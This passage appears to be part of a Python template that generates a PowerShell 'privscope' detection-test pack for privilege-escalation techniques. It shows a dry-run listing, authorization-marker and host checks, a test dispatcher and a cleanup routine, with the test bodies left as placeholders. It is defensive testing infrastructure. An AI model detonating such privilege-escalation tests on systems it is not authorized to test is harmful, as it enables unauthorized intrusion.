  }} catch {{ return $false }}
}}
function Pf-Cleanup {{
  foreach ($p in $script:PfBackups.Keys) {{ Copy-Item $script:PfBackups[$p] $p -Force -ErrorAction SilentlyContinue }}
  foreach ($f in $script:PfFiles) {{ Remove-Item $f -Force -ErrorAction SilentlyContinue }}
  Remove-Item $script:PfWork -Recurse -Force -ErrorAction SilentlyContinue
  Write-Host "[*] restored backups and cleaned up; log: $script:PfLog"
}}

function Pf-List {{
  Write-Host "privscope detection-test pack for $script:PfHost  ({count} tests)"
  Write-Host "  #   technique        att&ck      target"
{listing}
  Write-Host ''
  Write-Host 'Dry run. Re-run with -Execute to detonate (needs the authorization marker).'
}}

if (-not $Execute) {{ Pf-List; return }}

if (-not (Test-Path -LiteralPath $script:PfAuth)) {{
  Write-Error "REFUSED: authorization marker $script:PfAuth not found. Create it on hosts you may test."; return
}}
if (-not $ForceHost -and $env:COMPUTERNAME -ne $script:PfHost) {{
  Write-Error "REFUSED: this host '$env:COMPUTERNAME' is not the collection host '$script:PfHost' (use -ForceHost to override)."; return
}}
Write-Host "=== privscope detection-test pack: EXECUTING on $env:COMPUTERNAME as $(whoami) ==="
try {{
{tests}

  $sel = if ($Only) {{ $Only }} else {{ @({nums}) }}
  foreach ($n in $sel) {{ switch ($n) {{
{dispatch}
  }} }}
}} finally {{ Pf-Cleanup }}
Write-Host "[*] done. per-test results in $script:PfLog"
"""
